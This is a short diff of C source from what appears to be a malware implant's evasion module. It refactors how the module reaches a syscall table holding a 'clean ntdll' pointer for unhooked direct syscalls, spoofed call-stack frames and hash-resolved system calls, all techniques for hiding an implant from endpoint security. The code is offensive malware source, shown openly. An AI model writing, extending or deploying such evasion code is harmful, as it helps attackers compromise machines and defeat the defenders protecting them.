@@ -26,8 +26,7 @@ typedef __builtin_va_list va_list;
 /* Default number of spoofed frames per syscall invocation */
 #define EVASION_SPOOF_DEPTH 6
 
-/* External globals */
-extern SYSCALL_TABLE g_syscall_table;
+/* No extern globals — syscall table accessed via EVASION_CONTEXT */
 
 /* ------------------------------------------------------------------ */
 /*  Static evasion context storage                                     */
@@ -45,9 +44,15 @@ NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
 
     spec_memset(&g_evasion_ctx, 0, sizeof(EVASION_CONTEXT));
 
-    /* Copy clean ntdll pointer from the syscall table */
-    if (ctx->syscall_table)
+    /* Copy pointers from the implant context */
+    if (ctx->syscall_table) {
         g_evasion_ctx.clean_ntdll = ctx->syscall_table->clean_ntdll;
+        g_evasion_ctx.syscall_table = ctx->syscall_table;
+    }
+
+    /* Store back-pointer to implant context so evasion subsystems
+       (memguard, etc.) can reach sleep_ctx and other fields */
+    g_evasion_ctx.implant_ctx = ctx;
 
     /* Store evasion context pointer in the implant context early
        so syscall wrappers can always reach it — even if frame init
@@ -85,8 +90,11 @@ NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
 /* ------------------------------------------------------------------ */
 
 NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...) {
-    /* Look up the syscall entry from the global table */
-    SYSCALL_ENTRY *e = sc_get_entry(&g_syscall_table, func_hash);
+    if (!ctx || !ctx->syscall_table)
+        return STATUS_INVALID_PARAMETER;
+
+    /* Look up the syscall entry from the context's table */
+    SYSCALL_ENTRY *e = sc_get_entry(ctx->syscall_table, func_hash);
     if (!e)
         return STATUS_PROCEDURE_NOT_FOUND;
 
